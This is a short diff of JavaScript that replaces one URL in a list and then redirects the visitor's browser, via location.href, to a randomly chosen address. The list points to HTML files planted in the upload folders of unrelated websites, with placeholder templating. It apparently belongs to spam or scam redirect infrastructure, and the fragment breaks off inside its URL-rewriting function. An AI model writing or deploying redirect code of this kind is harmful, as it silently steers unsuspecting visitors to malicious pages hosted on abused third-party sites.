@@ -1,5 +1,5 @@
 var urls=[
-' http://images1.fangxiaoer.com./oss_images/salehouse/2024/05/06/20240506015622139.htm#{nnnnnnn}{wwww}',
+' http://tdhevend.cars.org.cn/upload/avatar/thumb_1715163849666.html#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
